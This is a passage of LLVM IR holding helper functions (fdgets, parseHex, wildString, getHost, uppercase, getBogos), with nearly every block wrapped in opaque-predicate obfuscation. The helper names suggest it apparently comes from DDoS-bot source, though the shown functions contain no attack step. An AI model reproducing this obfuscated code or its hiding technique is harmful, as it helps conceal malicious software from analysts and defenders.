  %46 = call i32 @close(i32 %45)
  %47 = call i32 @sigemptyset(%struct.__sigset_t* %14) #2
  %48 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 2) #2
  %49 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 3) #2
  %50 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 1) #2
  %51 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %14, %struct.__sigset_t* %13) #2
  %52 = load i32, i32* @x.21
  %53 = load i32, i32* @y.22
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %60

; <label>:60:                                     ; preds = %122, %originalBBpart24
  %61 = load i32, i32* @x.21
  %62 = load i32, i32* @y.22
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %60
  %69 = load i32*, i32** @fdopen_pids, align 8
  %70 = load i32, i32* %11, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i32, i32* %69, i64 %71
  %73 = load i32, i32* %72, align 4
  %74 = call i32 @waitpid(i32 %73, i32* %15, i32 0)
  store i32 %74, i32* %16, align 4
  %75 = load i32, i32* @x.21
  %76 = load i32, i32* @y.22
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %83

; <label>:83:                                     ; preds = %originalBBpart28
  %84 = load i32, i32* @x.21
  %85 = load i32, i32* @y.22
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %83
  %92 = load i32, i32* %16, align 4
  %93 = icmp eq i32 %92, -1
  %94 = load i32, i32* @x.21
  %95 = load i32, i32* @y.22
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %93, label %102, label %122

; <label>:102:                                    ; preds = %originalBBpart212
  %103 = load i32, i32* @x.21
  %104 = load i32, i32* @y.22
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %102
  %111 = call i32* @__errno_location() #13
  %112 = load i32, i32* %111, align 4
  %113 = icmp eq i32 %112, 4
  %114 = load i32, i32* @x.21
  %115 = load i32, i32* @y.22
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %122

; <label>:122:                                    ; preds = %originalBBpart216, %originalBBpart212
  %123 = phi i1 [ false, %originalBBpart212 ], [ %113, %originalBBpart216 ]
  br i1 %123, label %60, label %124

; <label>:124:                                    ; preds = %122
  %125 = load i32, i32* @x.21
  %126 = load i32, i32* @y.22
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %124
  %133 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %13, %struct.__sigset_t* null) #2
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %12, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 0, i32* %137, align 4
  %138 = load i32, i32* %16, align 4
  %139 = icmp eq i32 %138, -1
  %140 = load i32, i32* @x.21
  %141 = load i32, i32* @y.22
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %139, label %148, label %149

; <label>:148:                                    ; preds = %originalBBpart220
  br label %156

; <label>:149:                                    ; preds = %originalBBpart220
  %150 = bitcast %struct.in_addr* %17 to i32*
  %151 = load i32, i32* %15, align 4
  store i32 %151, i32* %150, align 4
  %152 = bitcast %struct.in_addr* %17 to i32*
  %153 = load i32, i32* %152, align 4
  %154 = and i32 %153, 65280
  %155 = ashr i32 %154, 8
  br label %156

; <label>:156:                                    ; preds = %149, %148
  %157 = phi i32 [ -1, %148 ], [ %155, %149 ]
  store i32 %157, i32* %10, align 4
  br label %158

; <label>:158:                                    ; preds = %156, %35
  %159 = load i32, i32* @x.21
  %160 = load i32, i32* @y.22
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %158
  %167 = load i32, i32* %10, align 4
  %168 = load i32, i32* @x.21
  %169 = load i32, i32* @y.22
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  ret i32 %167

originalBBalteredBB:                              ; preds = %originalBB, %1
  %176 = alloca i32, align 4
  %177 = alloca i32, align 4
  %178 = alloca i32, align 4
  %179 = alloca %struct.__sigset_t, align 8
  %180 = alloca %struct.__sigset_t, align 8
  %181 = alloca i32, align 4
  %182 = alloca i32, align 4
  %183 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %177, align 4
  %184 = load i32*, i32** @fdopen_pids, align 8
  %185 = icmp eq i32* %184, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  %186 = load i32, i32* %11, align 4
  %187 = call i32 @close(i32 %186)
  %188 = call i32 @sigemptyset(%struct.__sigset_t* %14) #2
  %189 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 2) #2
  %190 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 3) #2
  %191 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 1) #2
  %192 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %14, %struct.__sigset_t* %13) #2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %60
  %193 = load i32*, i32** @fdopen_pids, align 8
  %194 = load i32, i32* %11, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = call i32 @waitpid(i32 %197, i32* %15, i32 0)
  store i32 %198, i32* %16, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %83
  %199 = load i32, i32* %16, align 4
  %200 = icmp eq i32 %199, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %102
  %201 = call i32* @__errno_location() #13
  %202 = load i32, i32* %201, align 4
  %203 = icmp eq i32 %202, 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %124
  %204 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %13, %struct.__sigset_t* null) #2
  %205 = load i32*, i32** @fdopen_pids, align 8
  %206 = load i32, i32* %12, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  store i32 0, i32* %208, align 4
  %209 = load i32, i32* %16, align 4
  %210 = icmp eq i32 %209, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %158
  %211 = load i32, i32* %10, align 4
  br label %originalBB22
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %59, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %57

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @x.23
  %14 = load i32, i32* @y.24
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32, i32* %8, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp slt i32 %21, %22
  %24 = load i32, i32* @x.23
  %25 = load i32, i32* @y.24
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %57

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.23
  %34 = load i32, i32* @y.24
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i8*, i8** %4, align 8
  %42 = load i32, i32* %8, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = getelementptr inbounds i8, i8* %44, i64 -1
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp ne i32 %47, 10
  %49 = load i32, i32* @x.23
  %50 = load i32, i32* @y.24
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %57

; <label>:57:                                     ; preds = %originalBBpart24, %originalBBpart2, %9
  %58 = phi i1 [ false, %originalBBpart2 ], [ false, %9 ], [ %48, %originalBBpart24 ]
  br i1 %58, label %59, label %69

; <label>:59:                                     ; preds = %57
  %60 = load i32, i32* %6, align 4
  %61 = load i8*, i8** %4, align 8
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  %65 = call i64 @read(i32 %60, i8* %64, i64 1)
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %7, align 4
  %67 = load i32, i32* %8, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %8, align 4
  br label %9

; <label>:69:                                     ; preds = %57
  %70 = load i32, i32* %7, align 4
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  br label %75

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %4, align 8
  br label %75

; <label>:75:                                     ; preds = %73, %72
  %76 = phi i8* [ null, %72 ], [ %74, %73 ]
  ret i8* %76

originalBBalteredBB:                              ; preds = %originalBB, %12
  %77 = load i32, i32* %8, align 4
  %78 = load i32, i32* %5, align 4
  %79 = icmp slt i32 %77, %78
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %80 = load i8*, i8** %4, align 8
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = getelementptr inbounds i8, i8* %83, i64 -1
  %85 = load i8, i8* %84, align 1
  %86 = zext i8 %85 to i32
  %87 = icmp ne i32 %86, 10
  br label %originalBB1
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %86 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %69
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %108

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %49

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %47

; <label>:24:                                     ; preds = %19
  %25 = load i32, i32* @x.27
  %26 = load i32, i32* @y.28
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %4, align 8
  %34 = load i8*, i8** %5, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @wildString(i8* %33, i8* %35)
  %37 = icmp ne i32 %36, 0
  %38 = xor i1 %37, true
  %39 = load i32, i32* @x.27
  %40 = load i32, i32* @y.28
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2, %19
  %48 = phi i1 [ false, %19 ], [ %38, %originalBBpart2 ]
  br label %49

; <label>:49:                                     ; preds = %47, %13
  %50 = phi i1 [ true, %13 ], [ %48, %47 ]
  %51 = load i32, i32* @x.27
  %52 = load i32, i32* @y.28
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %49
  %59 = xor i1 %50, true
  %60 = zext i1 %59 to i32
  store i32 %60, i32* %3, align 4
  %61 = load i32, i32* @x.27
  %62 = load i32, i32* @y.28
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart216, label %originalBB4alteredBB

originalBBpart216:                                ; preds = %originalBB4
  br label %108

; <label>:69:                                     ; preds = %2
  %70 = load i8*, i8** %5, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %69
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 1
  %77 = load i8*, i8** %5, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = call i32 @wildString(i8* %76, i8* %78)
  %80 = icmp ne i32 %79, 0
  %81 = xor i1 %80, true
  br label %82

; <label>:82:                                     ; preds = %74, %69
  %83 = phi i1 [ false, %69 ], [ %81, %74 ]
  %84 = xor i1 %83, true
  %85 = zext i1 %84 to i32
  store i32 %85, i32* %3, align 4
  br label %108

; <label>:86:                                     ; preds = %2
  %87 = load i8*, i8** %4, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = call i32 @toupper(i32 %89) #10
  %91 = load i8*, i8** %5, align 8
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = call i32 @toupper(i32 %93) #10
  %95 = icmp eq i32 %90, %94
  br i1 %95, label %96, label %104

; <label>:96:                                     ; preds = %86
  %97 = load i8*, i8** %4, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 1
  %101 = call i32 @wildString(i8* %98, i8* %100)
  %102 = icmp ne i32 %101, 0
  %103 = xor i1 %102, true
  br label %104

; <label>:104:                                    ; preds = %96, %86
  %105 = phi i1 [ false, %86 ], [ %103, %96 ]
  %106 = xor i1 %105, true
  %107 = zext i1 %106 to i32
  store i32 %107, i32* %3, align 4
  br label %108

; <label>:108:                                    ; preds = %104, %82, %originalBBpart216, %9
  %109 = load i32, i32* %3, align 4
  ret i32 %109

originalBBalteredBB:                              ; preds = %originalBB, %24
  %110 = load i8*, i8** %4, align 8
  %111 = load i8*, i8** %5, align 8
  %112 = getelementptr inbounds i8, i8* %111, i64 1
  %113 = call i32 @wildString(i8* %110, i8* %112)
  %114 = icmp ne i32 %113, 0
  %_ = sub i1 %114, true
  %gen = mul i1 %_, true
  %_1 = sub i1 %114, true
  %gen2 = mul i1 %_1, true
  %_3 = shl i1 %114, true
  %115 = xor i1 %114, true
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %49
  %_5 = sub i1 %50, true
  %gen6 = mul i1 %_5, true
  %_7 = shl i1 %50, true
  %_8 = sub i1 false, %50
  %gen9 = add i1 %_8, true
  %_10 = sub i1 %50, true
  %gen11 = mul i1 %_10, true
  %_12 = sub i1 %50, true
  %gen13 = mul i1 %_12, true
  %_14 = shl i1 %50, true
  %116 = xor i1 %50, true
  %117 = zext i1 %116 to i32
  store i32 %117, i32* %3, align 4
  br label %originalBB4
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* @x.31
  %18 = load i32, i32* @y.32
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* @x.31
  %26 = load i32, i32* @y.32
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %16
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = load i32, i32* @x.33
  %3 = load i32, i32* @y.34
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [4096 x i8], align 16
  %14 = alloca i8*, align 8
  store i8* %0, i8** %11, align 8
  %15 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %15, i32* %12, align 4
  %16 = load i32, i32* @x.33
  %17 = load i32, i32* @y.34
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %146, %originalBBpart2
  %25 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %26 = load i32, i32* %12, align 4
  %27 = call i8* @fdgets(i8* %25, i32 4096, i32 %26)
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %148

; <label>:29:                                     ; preds = %24
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  call void @uppercase(i8* %30)
  %31 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %32 = call i8* @strstr(i8* %31, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %34 = icmp eq i8* %32, %33
  br i1 %34, label %35, label %146

; <label>:35:                                     ; preds = %29
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %37 = getelementptr inbounds i8, i8* %36, i64 8
  store i8* %37, i8** %14, align 8
  br label %38

; <label>:38:                                     ; preds = %55, %35
  %39 = load i8*, i8** %14, align 8
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 32
  br i1 %42, label %53, label %43

; <label>:43:                                     ; preds = %38
  %44 = load i8*, i8** %14, align 8
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 9
  br i1 %47, label %53, label %48

; <label>:48:                                     ; preds = %43
  %49 = load i8*, i8** %14, align 8
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 58
  br label %53

; <label>:53:                                     ; preds = %48, %43, %38
  %54 = phi i1 [ true, %43 ], [ true, %38 ], [ %52, %48 ]
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %53
  %56 = load i8*, i8** %14, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %14, align 8
  br label %38

; <label>:58:                                     ; preds = %53
  br label %59

; <label>:59:                                     ; preds = %95, %58
  %60 = load i8*, i8** %14, align 8
  %61 = load i8*, i8** %14, align 8
  %62 = call i64 @strlen(i8* %61) #10
  %63 = sub i64 %62, 1
  %64 = getelementptr inbounds i8, i8* %60, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 13
  br i1 %67, label %93, label %68

; <label>:68:                                     ; preds = %59
  %69 = load i32, i32* @x.33
  %70 = load i32, i32* @y.34
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = load i8*, i8** %14, align 8
  %78 = load i8*, i8** %14, align 8
  %79 = call i64 @strlen(i8* %78) #10
  %80 = sub i64 %79, 1
  %81 = getelementptr inbounds i8, i8* %77, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 10
  %85 = load i32, i32* @x.33
  %86 = load i32, i32* @y.34
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %93

; <label>:93:                                     ; preds = %originalBBpart24, %59
  %94 = phi i1 [ true, %59 ], [ %84, %originalBBpart24 ]
  br i1 %94, label %95, label %101

; <label>:95:                                     ; preds = %93
  %96 = load i8*, i8** %14, align 8
  %97 = load i8*, i8** %14, align 8
  %98 = call i64 @strlen(i8* %97) #10
  %99 = sub i64 %98, 1
  %100 = getelementptr inbounds i8, i8* %96, i64 %99
  store i8 0, i8* %100, align 1
  br label %59

; <label>:101:                                    ; preds = %93
  %102 = load i32, i32* @x.33
  %103 = load i32, i32* @y.34
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %101
  %110 = load i8*, i8** %14, align 8
